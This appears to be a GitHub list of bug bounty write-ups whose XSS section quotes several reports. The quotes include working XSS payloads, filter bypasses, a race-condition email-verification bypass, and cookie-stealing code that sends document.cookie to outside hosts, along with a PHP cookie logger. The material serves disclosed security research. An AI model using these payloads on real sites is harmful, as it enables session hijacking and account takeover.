![Awesome Bugbounty Writeups](https://raw.githubusercontent.com/devanshbatham/Awesome-Bugbounty-Writeups/master/static/logo.PNG)

## Contents 

 - [Cross Site Scripting (XSS)](https://github.com/g3nj1z/Awesome-Bugbounty-Writeups#cross-site-scripting-xss)
 - [Cross Site Request Forgery (CSRF)](https://github.com/g3nj1z/Awesome-Bugbounty-Writeups#cross-site-request-forgery-csrf)
 - [Clickjacking (UI Redressing Attack)](https://github.com/g3nj1z/Awesome-Bugbounty-Writeups#clickjacking-ui-redressing-attack)
 - [Local File Inclusion (LFI)](https://github.com/g3nj1z/Awesome-Bugbounty-Writeups#local-file-inclusion-lfi)
 - [Subdomain Takeover](https://github.com/g3nj1z/Awesome-Bugbounty-Writeups#subdomain-takeover)
 - [Denial of Service (DOS)](https://github.com/g3nj1z/Awesome-Bugbounty-Writeups#denial-of-service-dos)
 - [Authentication Bypass](https://github.com/g3nj1z/Awesome-Bugbounty-Writeups#authentication-bypass)
 - [SQL injection](https://github.com/g3nj1z/Awesome-Bugbounty-Writeups#sql-injectionsqli) 
 - [2FA Related issues](https://github.com/g3nj1z/Awesome-Bugbounty-Writeups#2fa-related-issues) 
 - [CORS Related issues](https://github.com/g3nj1z/Awesome-Bugbounty-Writeups#cors-related-issues)
 - [Server Side Request Forgery (SSRF)](https://github.com/g3nj1z/Awesome-Bugbounty-Writeups/blob/master/README.md#server-side-request-forgery-ssrf)
 - [Race Condition](https://github.com/g3nj1z/Awesome-Bugbounty-Writeups/blob/master/README.md#race-condition)
 - [Remote Code Execution (RCE)](https://github.com/g3nj1z/Awesome-Bugbounty-Writeups#remote-code-execution-rce)  
 - [Contributing](https://github.com/g3nj1z/Awesome-Bugbounty-Writeups#contributing)
 - [Maintainers](https://github.com/g3nj1z/Awesome-Bugbounty-Writeups#maintainers)



## Cross Site Scripting (XSS)

- [From P5 to P2 to 100 BXSS](https://medium.com/@mohameddaher/from-p5-to-p5-to-p2-from-nothing-to-1000-bxss-4dd26bc30a82)

I decided to start over and create a new account.

When I filled all the details, they asked me to verify my email first but I could also change the email to another one in case I made a mistake. I directly thought about Race-Condition to use any email without verifying it.

Here’s how you can do it (we’ll assume that we have access to lasok@dot-coin.com and we want to register with aa@aa.com)

1/ Add an email to the account and open the email with the verification link but don’t click on it yet (In my case I added lasok@dot-coin.com and opened the mail they sent me)

2/ On the website click on “change email”. Change the email to the one you want to use without verification but don’t click on send link now. (Now I changed the email to aa@aa.com)

Here comes the tricky part.

You have to click on the verification link and change your email at the same time.

You can do that without burp but you may have to try a few times before it works so here is a method to make it work every time:

Start burp and turn intercept on

Now open the verification link you received on lasok@dot-coin.com then switch tab and validate the new email on the website (aa@aa.com) then turn intercept off. Burp will forward the 2 requests together and that’s what we want.

aa@aa.com was verified and I could now login to my account.

In this case what you should do is to register with email@company.com, sometimes you can get access to some cool admin features.

But unfortunately for me it wasn’t the case here but I still reported it and as expected, closed as P5.


Now we have to escalate this to give a valid impact in order to be a valid bug.

After some minutes I tried to escalate this to XSS.

Did the same process but instead of entering a fake email in the second step I entered : <svg/onload=alert(1)> and XSS triggered. But since my email is private and only me can see it, this is a Self-XSS.

So we went from Race-Condition (P5) to Self-XSS (P5).

Now, what ?

I remembered that this private program also had a forum dedicated to their site.

I did the same process again but instead of entering a regular XSS payload I entered a Blind XSS payload. Mine was : “></script><script src=//m0m0x01d.xss.ht></script> (Tip : Use xsshunter.com tool to find blind xss)

I then went to the forum, created a new weird thread (to be sure that the admin will delete it) and reported my own thread to be sure that the admins see it.

Within hours I got an email alerting me that someone triggered my XSS.

Reading the XSSHunter report :

Triggered at : https://www.company.com/profile/XXXX

Referer : https://forums.company.com/XX/index.php?/topic/123456--/

The admin saw my weird thread, then he clicked on my username → redirected to my profile → XSS triggered

The reason why it triggered was that the admins had the feature to see the email of any user only by visiting their profile.

I now had the session cookie of the admin and I could use it to get access to the internal panel.

So that’s how I went from a P5 Race Condition to a P5 Self XSS to a P2 Blind XSS.

    Take-away :

    1/ If you’r able to use any email without verification, try registering with email@domain.com you may get access to some admin features

    2/ Always look for the highest severity. Here if the program accepted the bug as P4 I would get 100$ for that instead of 10x the bounty for the XSS

    3/ When you find a P5 bug you may use it and chain it with another bug to increase the severity (tip 2), they are not always useless

- [Google Acquisition XSS (Apigee)](https://medium.com/@TnMch/google-acquisition-xss-apigee-5479d7b5dc4)

  I enter apigee.com which provides API management, so as always I start my burp suite and I try to verify all the functions as possible,
  
  On the first try, everything was secure and all my first test failed, but as a bug hunter it should not be 100% secure and nothing is safe, So I log out and start to check the   login and register option, look all right here
  
  at some point, I tried to check the password reset action, get a link in my email account that looks like this
  
  ![xssapigee1](https://miro.medium.com/max/875/1*6XtCH-i6JORylw3RssPuMA.png)
  >
  > https://api.accounts.apigee.com/management/users/[REDACTED]/resetpw?token=ZW0tsHaU-REDACTED-eeTDi2YRIN1CICmFjOSSE2JvllO_-REDACTED-
  >
  Here, I have the idea to try to bypass the token and obtain a valid link for all users, which allows me to update any user password, but this failed too and can’t bypass it
  
  when I was trying to edit the link and change the token code, I saw something normal for me, it looks like this entry has not been filtered here, so I tried to send some XSS     payload as a test.
  
  ![xssapigee2](https://miro.medium.com/max/875/1*ZnE07D9YoVUQ6TO8pUgJBA.png)
  
  ![xssapigee3](https://miro.medium.com/max/875/1*Mh0BMWvAeWAGfP1ksvVJhw.png)
  
  let's steal some cookies 😍
  
  as it's not legal to hack someone account, I tested in my own account
  
  1. create first the payload :
  >
  > https://api.accounts.apigee.com/management/users/xxxxxx/resetpw?token=xxxxxxx"><script>new Image().src=’https://requestb.in/xxxxxx?code='+document.cookie</script><a href=”
  >
  2. ON CLICK & All cookies will be sent to us😅

- [DOM-Based XSS at accounts.google.com by Google Voice Extension](http://www.missoumsai.com/google-accounts-xss.html)
- [XSS on Microsoft.com via Angular Js template injection](https://medium.com/@impratikdabhi/reflected-xss-on-microsoft-com-via-angular-template-injection-2e26d80a7fd8)
- [Researching Polymorphic Images for XSS on Google Scholar](https://blog.doyensec.com/2020/04/30/polymorphic-images-for-xss.html)
- [Netflix Party Simple XSS](https://medium.com/@kristian.balog/netflix-party-simple-xss-ec92ed1d7e18)
- [Stored XSS in google nest](https://medium.com/bugbountywriteup/stored-xss-in-google-nest-a82373bbda68)
- [Self XSS to persistent XSS on login portal](https://medium.com/@nnez/always-escalate-from-self-xss-to-persistent-xss-on-login-portal-54265b0adfd0)
- [Universal XSS affecting Firefox ](https://0x65.dev/blog/2020-03-30/cve-2019-17004-semi-universal-xss-affecting-firefox-for-ios.html)
- [XSS WAF Character limitation bypass like a boss](https://medium.com/bugbountywriteup/xss-waf-character-limitation-bypass-like-a-boss-2c788647c229)
- [Self XSS to Account Takeover ](https://medium.com/@ch3ckm4te/self-xss-to-account-takeover-72c89775cf8f)
- [Reflected XSS on Microsoft subdomains ](https://medium.com/bugbountywriteup/reflected-xss-on-microsoft-com-subdomains-4bdfc2c716df)
- [The tricky XSS](https://smaranchand.com.np/2020/02/the-tricky-xss/)

1.XSS payload by Dr. Mario

2.minimal code for stealing cookies and sending it to a remote server

    document.location='https://ł.rip/save.php?c='+document.cookie;

3.source code of save.php file is given below which would save the cookie into a text file

>     <?php
>     header('Location:https://yourdomain.com');
>     $cookies = $_GET["c"];
>     $file = fopen('logs.txt', 'a');
>     fwrite($file, $cookies . "\n\n");
>     ?>
     
4.The cookies will be saved in logs.txt file in the remote server, we can capture mouse movement, keystrokes as well

5.And then I confirmed the working of the script by executing at my own end and here we go. Biscuits coming to our remote server

6.Now opening logs.txt, just to confirm the cookies.

7.Unfortunately, the XSS never got executed in the shop admin dashboard/backend


- [Reflected XSS  in AT&T](https://medium.com/@godofdarkness.msf/reflected-xss-in-at-t-7f1bdd10d8f7)
- [XSS on Google using Acunetix ](https://www.acunetix.com/blog/web-security-zone/xss-google-acunetix/)
- [Exploiting websocket application wide XSS](https://medium.com/@osamaavvan/exploiting-websocket-application-wide-xss-csrf-66e9e2ac8dfa)
- [Reflected XSS with  HTTP Smuggling ](https://hazana.xyz/posts/escalating-reflected-xss-with-http-smuggling/)
- [XSS on Facebook instagram CDN server bypassing signature protection ](https://www.amolbaikar.com/xss-on-facebook-instagram-cdn-server-bypassing-signature-protection/)
- [XSS on Facebook's Acquisition Oculus](https://www.amolbaikar.com/xss-on-facebooks-acquisition-oculus-cdn-server/)
- [XSS on sony Subdomain ](https://medium.com/@gguzelkokar.mdbf15/xss-on-sony-subdomain-feddaea8f5ac)
- [Exploiting Self XSS ](https://footstep.ninja/posts/exploiting-self-xss/)
- [Effortlessly Finding Cross Site Scripting inclusion XSSI ](https://medium.com/bugbountywriteup/effortlessly-finding-cross-site-script-inclusion-xssi-jsonp-for-bug-bounty-38ae0b9e5c8a)
- [Bugbounty a DOM XSS](https://jinone.github.io/bugbounty-a-dom-xss/)
- [Blind XSS : a mind Game ](https://medium.com/@dirtycoder0124/blind-xss-a-mind-game-to-win-the-battle-4fc67c524678?)
- [FireFox IOS QR code reader XSS(CVE-2019-17003)](https://payatu.com/blog/nikhil-mittal/firefox-ios-qr-code-reader-xss-(cve-2019-17003))
- [HTML injection to XSS](https://evanricafort.blogspot.com/2019/12/html-injection-to-xss-bypass-in.html)
- [XSS at error page of repository code ](https://medium.com/@navne3t/150-xss-at-error-page-of-respository-code-4fc628892742)
- [XSS like a Pro](https://www.hackerinside.me/2019/12/xss-like-pro.html)
- [How I turned self XSS to stored XSS via CSRF](https://medium.com/@abhishake100/how-i-turned-self-xss-to-stored-via-csrf-d12eaaf59f2e)
- [XSS Stored on Outlook web](https://medium.com/@elmrhassel/xss-stored-on-outlook-web-outlook-android-app-ad4bd46b8823)
- [XSS Bug 20 Chars Blind XSS Payload](https://medium.com/@mohameddaher/how-i-paid-2-for-1054-xss-bug-20-chars-blind-xss-payloads-12d32760897b)
- [XSS in AMP4EMAIL(DOM clobbering)](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)
- [DOM Based XSS bug bounty writeup](https://hacknpentest.com/dom-based-xss-bug-bounty-writeup/)
- [XSS will never die ](https://medium.com/@04sabsas/xss-will-never-die-eb3584081a5f)

Part 1 — Stored XSS for mobile on the forum

Really love forums since there are a lot of potential vulnerabilities due to a huge list of functions. I went to the forum.example.com/post?id=123 and started testing of File Upload via URL functionality — here I noticed that it taking the name of file and inserting it twice on the page — in <img> tag and in the description of the file, it looks like:

    <html>
    <body>
    <span>Imagine funny text here</span>
    <br>Attached: 1.webp
    <img src="http://testing.lekssik.com/img/1.webp">
    </body>
    </html>

what if insert “ to the name? Ok, lets test http://…/1.webp”

    <html>
    <body>
    <span>Imagine funny text here</span>
    <br>Attached: 1.webp&quot
    <img src="http://testing.lekssik.com/img/1.webp">
    </body>
    </html>

What happens? All the DOM-events are removing (<img/src=x/onerror=a> going to <img/src=x>🤯). But, but it turned out that not all. As the world is always improving, DOM-events appeared for mobile too — so they were not blacklisted and we got Stored-XSS for mobile devices. 

Also do not forget that you can use alert`1` instead of alert(1) (here service blocked all the parameters inside “()”)

    Resume: no blacklists will help due to the improving of technology — everything cannot be prevented. But filter quotes — it’s quite possible to try.

    Here we saw that a quote was inserted into html-code — and with the idea “I won’t believe that you will block all the possible DOM-events” we found that the mobile events were not blacklisted and got Stored XSS in forum post.

Part 2 — Reflected XSS on email preview

I got an email from our HUGE-shop, and they use the domain email.example.com to view emails, like email.example.com/view?id=123&key=abc&statname=DiscountEmail. The parameter “statname” was <input type=”hidden”> and did nit filter the “, but filtered <>. So, we just looked how to exploit XSS in hidden input and founded “accesskey=’X’ onclick=’alert(1)’”. It worked, and we got Reflected-XSS.

    Resume: You will increase your chances of finding vulnerabilities if you subscribe to newsletters from the service that you are testing. Firstly, you will receive news about service updates, and will be able to test it faster than other hackers (I do remember how some guy tested YouTube Beta-studio as soon as it was presented and found great IDOR in 15k$). Secondly — it is quite possible that in the email you will find vulnerable links due to less attention to such minor functionality.

    So after finding non-filtered quotes and quick-recon in Google “XSS hidden input”, we have found the way to exploit it with “accesskey”.
    
Part 3 — Stored XSS in live support chat

They had domain support.example.com, where we can find some information about using the service and chat online with manager in case of needing of the help. And you know what — I started chat with manager, and inserted <img src=”x” onerror=”alert(1)”> — it was injected into html-source!

As I later understood, no one could get to test this thing — first you have to go to the site at a time when managers are online, and this time is limited to 6 hours a day. Secondly, you need to start a chat, and for this we need to wait for about half an hour to start a conversation with an online manager. That is, from the 3rd time I decided to test this functional, and from 5th time I got into the chat — I think this explains why no one found this thing before.

    Resume: Any company has a lot of functionality, and sometimes some things remain outside the scope of developers. We all know that we need to test all the possible functionality, but, unfortunately, sometimes we miss vulnerabilities due to laziness or fatigue.

    Here we found a service that was probably created a very long time ago, but was not updated from a security point of view, since no one checked it.

Part 4 — Reflected XSS in User Dashboard

So here we have User Dashboard, and functionality of filtering our activities — we can insert value “time_from” to filter it with the dates.

Ok, next step — does it filter “< >”. Yes, so I decided that we would exploit this via an input element with DOM-events. But after ‘time_from=”777" onfocus=”alert(1)”’ I got it:

    value="time_from="777" ="alert&#40;1&#41;"
    
What just happened? Like in the Part1, it is filtering DOM-events and removing it. But, everything is much more complicated — they don’t have a blacklist, they just block all the parameters in the tag that starts from “on” 🤷‍♂️🙂️🤷‍♂️ Suddenly I was attracted by another coincidence on the page with the entered data and I saw such a strange field.

It was something like break-links logger and… here “<>” were not filtered.

I want to stop at this step so that you understand what is going on: we have a filtering function for our activities (user.example.com/activities?time_from=777&acc=submit, and the “time_from” parameter is vulnerable. But there is protection in the application: it removes events (the WAF finds everything inside the tag that starts on “on”). If this happens, the logger fires, captures the broken link, and inserts it in a strange way to page source without filtering “ and <> 👍

But you remember that all DOM-events are removing — I started looking for tags that you can insert and receive XSS, but it turned out that it cuts them out just like events. Another one “but”: I noticed a strange thing — if I wrote a tag, but didn’t close it — it didn’t delete it, that is, only the closed tag was cut out. 

So now we can insert link to execute script, but how to close script tag? If the src is given in script tag — all the source is ignoring inside the tag, so we just need any </script> later on the page.

Let me please explain again what just happened: so we found the broken value “old_request”, that creating if we add something potential danger to url (DOM-event). And in this value we can insert ‘<>” into source, but still can not insert tags and DOM-events. But since the input tag was closing itself — we insert “<script/src=//url and WAF do not see it as dangerous input, so do not removing. Then we discard all the garbage that is passed later through ? (as parameters for the GET request). Now the JavaScript logic gave us an advantage — since the resource for the script is specified, everything inside the tag will be ignored, and the site will wait for the closing tag — which will meet somewhere further anywhere in the source, for example, calling jQuery.

    Resume: no blacklists will help due to the improving of technology — everything cannot be prevented. But filter quotes — it’s quite possible to try. [PART1]

    So here we got unfiltered quot, then strange “logging functionality” with unfiltered <>, and even WAF with his blacklists is a little hard — we finally exploited it with understanding of the logic of HTML and JavaScript.

Part 5— Self XSS + Clickjacking = Nice XSS

The last one XSS — will be easy to understand. You sometimes meet Self-XSS, in the functionality of the editing users data, in the form of feedback, etc. But because of the fact that there is no definite request with the help of which XSS is injected — such vulnerabilities are considered as N/A due to the fact that user actions are required.

But, we do have some great thing as Clickjacking — terror of the past 10 years of the web (previously it was very widespread vulnerabilities, as now IDOR). I think you know what is it, but I hope to be useful and explain this to beginners. This vulnerability arises when the site allows to be inserted to <iframe> and thus we impose it invisibly and make some forms that interfere with the coordinates of how that functionality is located on the attacked site that we want to hack — and when user use attacker’s site and inserting data there — user inserting data to another site due to iframe. Here it is described in more human language: https://www.owasp.org/index.php/Clickjacking.

So on feedback.example.com/feedback we can left feedback, it forwards to another non-scope service, but inserts on the origin page “Thanks [username]”. And this [username] was not filtering any html-source, directly inserting everything to the page. Since we did not have direct request, we started to check the X-FRAME — to my luck, it turned out to be vulnerable to clickjacking, and I just created an html+css form, which showed how it works. Here you can find examples of great reports for Clickjacking: https://www.google.com/?q=site:hackerone.com%20intitle:clickjacking

    Resume: Increase your knowledges, because this is what will always be with you, and will help everywhere.

    Here, thanks to what we knew about the clickjacking , we exploited Self-XSS without any problems.


- [5000 USD XSS issue at avast desktop antivirus](https://medium.com/bugbountywriteup/5-000-usd-xss-issue-at-avast-desktop-antivirus-for-windows-yes-desktop-1e99375f0968)
- [XSS to account takeover](https://noobe.io/articles/2019-10/xss-to-account-takeover)
- [How Paypal helped me to generate XSS](https://medium.com/@pflash0x0punk/how-paypal-helped-me-to-generate-xss-9408c0931add)
- [Bypass Uppercase filters like a PRO(XSS advanced methods)](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [Stealing login credentials with reflected XSS ](https://medium.com/@mehulcodes/stealing-login-credentials-with-reflected-xss-7cb450bf5710)
- [bughunting xss on cookie popup warning ](https://victoni.github.io/bug-hunting-xss-on-cookie-popup-warning/)
- [XSS is love](https://nirmaldahal.com.np/xss-is-love/)
- [Oneplus XSS vulnerability in customer support portal](https://medium.com/@tech96bot/oneplus-xss-vulnerability-in-customer-support-portal-d5887a7367f4)
- [Exploiting cookie based XSS by finding RCE ](https://noobe.io/articles/2019-09/exploiting-cookie-based-xss-by-finding-rce)
- [Stored XSS on zendesk via macros ](https://medium.com/@hariharan21/stored-xss-on-zendesk-via-macros-part-2-676cefee4616)
- [XSS in ZOHO main](https://www.hackerinside.me/2019/09/xss-in-zoho-mail.html)
- [DOM based XSS in private program](https://www.mohamedharon.com/2019/09/dom-based-xss-in-private-program.html)
- [Bugbounty writeup : Take Attention and get stored XSSS](https://medium.com/@04sabsas/bugbounty-writeup-take-attention-and-get-stored-xss-495dd6eab07e)

Let’s imagine that we have a Web Application “WA”, that allows you to create users, companies and invite users to the company.

The functional of inviting worked like this — the user received a letter in the mail, where it was said: “You were invited to join company 

As the site allowed us to name of company contain “<> etc — I put the name of company as:

    lekssik"><h1>xd</h1>
    
And you know what… I got such invite on email:

### xd

So I got such things earlier, and in principle… we can already report at this point, since this allows us to generate HTML messages by mail and send on behalf of the web application. (I used to find such a vulnerability on the site of one mobile giant, there we could change some parameters in the post request for registration, and then the link to confirm the account came with a broken HTML).

But… I sat on the site a little more and found that the site has internal notifications that you were invited — and when you go to the notification page — a window appears that says about the invitation. And you know what? They also did not filter html on this page :))))))

Sooo, lets register comapany a”><svg\onload=alert(1)> and — for all the users that we invite — they receive notifications about the invitation, thereby activating the Stored XSS.

    While I was writing this WriteUp, I suddenly started to feel sorry for myself too — I remembered the #bugbountytips from intigrity — and there was a picture like “Found SSRF — exploit RCE, found Self-XSS — exploit Stored XSS with the help of CSRF, Found Stored XSS — exploit Account Takeover”. And only now I realized that I could work a little more and get much more, even P1. I hope you do not repeat my mistakes, always take the maximum impact from any vulnerability!

- [How I xssed admin account ](https://gauravnarwani.com/how-i-xssed-admin-account/)
- [Clickjacking XSS on google ](https://websecblog.com/vulns/clickjacking-xss-on-google-org/)
- [Stored XSS on laporbugid](https://learn.hackersid.com/2019/08/stored-xss-on-laporbugid.html)
- [Leveraging angularjs based XSS to privilege escalation](https://www.shawarkhan.com/2019/08/leveraging-angularjs-based-xss-to-privilege-escalation.html)
- [How I found XSS by searching in shodan](https://blog.usejournal.com/how-i-found-xss-by-searching-in-shodan-6943b799e648)
- [Chaining caache poisining to stored XSS](https://medium.com/@nahoragg/chaining-cache-poisoning-to-stored-xss-b910076bda4f)
- [XSS on twitter worth 1120](https://medium.com/@bywalks/xss-on-twitter-worth-1120-914dcd28ee18)
- [Reflected XSS in ebay.com](https://medium.com/@madguyyy/reflected-xss-in-ebay-com-60a9d61e26cd)
- [Cookie based XSS exolpoitation 2300 bug bounty ](https://medium.com/@iSecMax/сookie-based-xss-exploitation-2300-bug-bounty-story-9bc532ffa564)
- [What do netcat -SMTP-self XSS have in common ](https://medium.com/bugbountywriteup/what-do-netcat-smtp-and-self-xss-have-in-common-stored-xss-a05648b72002)
- [XSS on google custom search engine ](https://thesecurityexperts.wordpress.com/2019/07/11/xss-on-google-custom-search-engine/)
- [Story of a Full Account Takeover vulnerability N/A to Accepted ](https://medium.com/@nandwanajatin25/story-of-a-stored-xss-to-full-account-takeover-vulnerability-n-a-to-accepted-8478aa5e0d8e)
- [Yeah I got p2 in 1 minute stored XSS via markdown editor ](https://medium.com/@schopath/yeah-i-got-p2-in-1-minute-stored-xss-via-markdown-editor-7872dba3f158)
- [Stored XSS on indeed ](https://cyberzombie.in/stored-xss-on-indeed/)
- [Self XSS to evil XSS](https://medium.com/@saadahmedx/self-xss-to-evil-xss-bcf2494a82a4)
- [How a classical XSS can lead to persistent  ATO vulnerability](https://hackademic.co.in/how-a-classical-xss-can-lead-to-persistent-ato-vulnerability/)
- [Reflected XSS in tokopedia train ticket ](https://visat.me/security/reflected-xss-in-tokopedia-train-ticket/)
- [Bypassing XSS filter and stealing user credit card data](https://medium.com/@osamaavvan/bypassing-xss-filter-and-stealing-user-credit-card-data-100f247ed5eb)
- [Googleplex.com blind XSS](https://websecblog.com/vulns/googleplex-com-blind-xss/)
- [Reflected XSS on error page ](https://noobe.io/articles/2019-06/reflected-xss-on-error-page)

Sometimes to exploit an XSS (specifically Reflected XSS), we are focused on finding input pages such as Search Columns, etc to find out is that form has an XSS vulnerability or not.

Not infrequently, a developer is only focused on doing sanitation and filters on these attacks on pages that visitors commonly visit. It does not rule out the possibility of XSS attacks can be affected on other pages, including an Error Pages.

When doing some Private Bug Hunting on Bugcrowd, I found a feature for Uploading and Downloading file. After the file is being uploaded successfully, to download the file, the user will be directed to the URL like this:

    https://b15.[redacted.com]/file.php?spaceid=user@mail.com&file=filename.jpg

At first, I thought the URL had an LFI or LFD vulnerability, but after trying to change the file parameters with another file, it didn’t work and gave an error message.

    https://b15.[redacted.com]/file.php?spaceid=&file=../../../../etc/passwd

But if you pay attention, the contents of the file parameter are reflected on the error page. Then I tried to insert an HTML tag to test whether there is a filter or not in the parameters of the file.

And sure enough, HTML tags were successfully rendered on that page.

    https://b15.[redacted.com]/file.php?spaceid=&file=<h1>asu

Without waiting a long time, I immediately tried an XSS payload on the page, and XSS was executed!

    https://b15.[redacted.com]/file.php?spaceid=&file=<img src=x onmouseover=alert(1)>

Some tips for hunting Reflected XSS is to test various parameters contained in an endpoint. Either on the Front End Page or even on the Error Page.

- [How I was able to get private ticket response panel and fortigate web panel via blind XSS ](https://pwnsec.ninja/2019/06/06/how-i-was-able-to-get-private-ticket-response-panel-and-fortigate-web-panel-via-blind-xss/)
- [Unicode vs WAF](https://medium.com/bugbountywriteup/unicode-vs-waf-xss-waf-bypass-128cd9972a30)
- [Story of URI based XSS with some simple google dorking ](https://medium.com/@nandwanajatin25/story-of-a-uri-based-xss-with-some-simple-google-dorking-e1999254aa55)
- [Stored XSS on edmodo](https://medium.com/@matarpan33r/stored-xss-on-edmodo-67b244824fa5)
- [XSSed my way to 1000](https://gauravnarwani.com/xssed-my-way-to-1000/)
- [Try harder for XSS](https://medium.com/@fbotes2/try-harder-for-xss-7aa3657255a1)
- [From parameter pollution to XSS](https://medium.com/@momenbasel/from-parameter-pollution-to-xss-d095e13be060)

I noticed that on clicking on any link on the main page it will redirect the user to a page to make sure that the user is aware that this will redirect him/her to another website. the URL looks like this: 

    <redacted>/intersticial.aspx?dest=http://whitelistedWebsite.com
 
I tried editing the whitelistedWebsite.com to javascript:alert(1) but it didn’t work as the URL must match the whitelisted sites. then I tried to redirect to /intersticial.aspx?dest=javascript://whitelistedWebsite.com and opened the chome devtools

I concluded that the parameter accepts any scheme but a whitelisted website must be added to the scheme.

example:

/intersticial.aspx?dest=data://whitelistedWebsite.com → Accepted

/intersticial.aspx?dest=http://google.com → not Accepted

I tried to think for a way to write javascript and the URL together and get the javascript run.

I tried to add %0a%0d which adds a newline but redirected to a forbidden page.

I started thinking of adding the whitelisted website as a variable then add a semicolon which terminates javascript line but the website doesn’t accept adding a semicolon to this parameter and redirects me to the homepage instead as the URL must be after the scheme directly not after var url=whitelistedWebsite.com.

I tried to enter javascript:/whitelistedWebsite.com/i as a value of parameter “dest” and found out that parameter not only accepts schemes like(http://, ftp://) but also accept http:/ and javascript:/.

after that Regex immediately came to my thought for those who don’t know about regex it is a sequence of characters that define a search pattern and can be used at almost any programming language.

    /intersticial.aspx?dest=javascript:/whitelistedWebsite.com/i;alert(document.domain)

then website refused the request as it includes a semicolon and I want to put anything to separate this two valid javascript statement to be able to execute JS. then I tried to add another parameter with the same name “dest “

so the URL became

    <redacted>intersticial.aspx?dest=javascript:/whitelistedWebsite.com/i&dest=
 
Then I noticed that there is a comma added to the URL then added an alert function on the second parameter value and once I clicked acceptar

the final URL: 

    <redacted>intersticial.aspx?dest=javascript:/whitelistedWebsite.com/i&dest=alert(1)
    
Conclusion:

    may HTTP parameter pollution don’t lead to serious harm but can help on a bypass that may reach you to P1 or P2 vulnerability. if you find that a parameter accepts redirect to javascript://website.com then you should never lose hope and keep searching!

- [MIME  sniffing XSS](https://www.komodosec.com/post/mime-sniffing-xss)
- [Stored XSS on techprofile Microsoft  ](https://medium.com/@kang_ali/stored-xss-on-techprofile-microsoft-d21757588cc1)
- [Tale of a wormable Twitter XSS](https://www.virtuesecurity.com/tale-of-a-wormable-twitter-xss/)
- [XSS attacks google bot index manipulation](http://www.tomanthony.co.uk/blog/xss-attacks-googlebot-index-manipulation/)
- [From Reflected XSS to Account takeover ](https://medium.com/a-bugz-life/from-reflected-xss-to-account-takeover-showing-xss-impact-9bc6dd35d4e6)
- [Stealing local storage data through XSS](http://blog.h4rsh4d.com/2019/04/stealing-local-storage-data-through-xss.html)
- [CSRF attack can lead to stored XSS](https://medium.com/bugbountywriteup/csrf-attack-can-lead-to-stored-xss-f40ba91f1e4f)
- [XSS Reflected (filter bypass)](https://medium.com/bugbountywriteup/xss-reflected-xss-bypass-filter-de41d35239a3)
- [XSS protection bypass on hackerone private program](https://medium.com/@bughunter.sec7/how-i-was-able-to-bypass-xss-protection-on-hackerones-private-program-8914a31339a9)
- [Just 5 minutes to get my 2nd Stored XSS on edmodo.com](https://medium.com/@ZishanAdThandar/just-5-minute-to-get-my-2nd-stored-xss-on-edmodo-com-fe2ee559e00d)
- [Multiple XSS in  skype.com ](https://medium.com/@jayateerthag/multiple-xss-in-skype-com-2-18cfed39edbd)
- [Obtaining XSS using moodle featured and minor bugs ](https://medium.com/@daniel.thatcher/obtaining-xss-using-moodle-features-and-minor-bugs-2035665989cc)
- [XSS on 403 forbidden bypass akamai WAF](https://medium.com/@bughunter.sec7/xss-403-forbidden-bypass-akamai-security-write-up-b341f588efb5)
- [How I was turn self XSS into reflected XSS](https://medium.com/@heinthantzin/how-i-was-able-to-turn-self-xss-into-reflected-xss-850e3d5a2beb)
- [A Tale of 3 XSS](https://gauravnarwani.com/a-tale-of-3-xss/)
- [Stored XSS on Google.com](https://medium.com/@bughunter.sec7/stored-xss-on-google-com-e7ac12f03b8e)
- [Stored XSS in the Guides gameplaersion (www.dota2.com)](https://medium.com/@bughunter.sec7/stored-xss-in-the-guides-gameplayversion-www-dota2-com-775fa9a1889b)
- [Admin google.com reflected XSS](https://buer.haus/2015/01/21/admin-google-com-reflected-cross-site-scripting-xss/)
- [Paypal Stored security bypass ](https://blog.it-securityguard.com/bugbounty-paypal-stored-xss-security-bypass/)
- [Paypal DOM XSS main domain](https://blog.it-securityguard.com/bugbounty-paypal-dom-xss-main-domain/)
- [Bugbounty  : The 5k$ Google XSS](https://blog.it-securityguard.com/bugbounty-the-5000-google-xss)
- [Facebook stored XSS](https://buer.haus/2014/06/16/facebook-stored-cross-site-scripting-xss-badges/)
- [Ebay mobile reflected XSS](https://thehackerblog.com/ebay-mobile-reflected-xss-disclosure-writeup/index.html)
- [Magix bugbounty XSS writeup](https://www.rcesecurity.com/2014/04/magix-bug-bounty-magix-com-rce-sqli-and-xara-com-lfi-xss/)
- [Abusing CORS for an XSS on flickr ](https://whitton.io/articles/abusing-cors-for-an-xss-on-flickr/)
- [XSS on google groups ](https://manuel-sousa.blogspot.com/2013/11/xss-google-groups-groupsgooglecom.html)
- [Oracle XSS](http://blog.shashank.co/2013/11/oracle-xss.html)
- [Content types and XSS Facebook Studio](https://whitton.io/articles/content-types-and-xss-facebook-studio/)
- [Admob Creative image XSS](https://bitquark.co.uk/blog/2013/07/19/admob_creative_image_xss)
- [Amazon Packaging feedback XSS](https://bitquark.co.uk/blog/2013/07/03/amazon_packaging_feedback_xss)
- [PaypalTech XSS ](https://www.rcesecurity.com/2013/04/paypal-bug-bounty-paypaltech-com-xss/)
- [Persistent XSS on my world](https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/)
- [Google VRP XSS in device management](https://sites.google.com/securifyinc.com/vrp-writeups/gsuite/bookmark-xss-device-management)
- [Google VRP XSS](https://sites.google.com/securifyinc.com/vrp-writeups/hire-with-google/xsses)
- [Google VRP Blind XSS](https://sites.google.com/securifyinc.com/vrp-writeups/hire-with-google/blind-xss)
- [WAZE XSS](https://sites.google.com/securifyinc.com/vrp-writeups/waze/waze-xss)
- [Referer Based XSS](https://medium.com/@arbazhussain/referer-based-xss-52aeff7b09e7)
- [How we invented the Tesla DOM XSS](https://labs.detectify.com/2017/07/27/how-we-invented-the-tesla-dom-doom-xss/)
- [Stored XSS on rockstar game](https://medium.com/@arbazhussain/stored-xss-on-rockstar-game-c008ec18d071)
- [How I was able to bypass strong XSS protection in well known website imgur.com](https://medium.com/bugbountywriteup/how-i-was-able-to-bypass-strong-xss-protection-in-well-known-website-imgur-com-8a247c527975)
- [Self XSS to Good XSS](https://medium.com/@arbazhussain/self-xss-to-good-xss-clickjacking-6db43b44777e)
- [That escalated quickly : from partial CSRF to reflected XSS to complete CSRF to Stored XSS](https://medium.com/@ciph3r7r0ll/that-escalated-quickly-from-partial-csrf-to-reflected-xss-to-complete-csrf-to-stored-xss-6ba8103069c2)
- [XSS using dynamically generated js file](https://medium.com/@arbazhussain/xss-using-dynamically-generated-js-file-a7a10d05ff08)
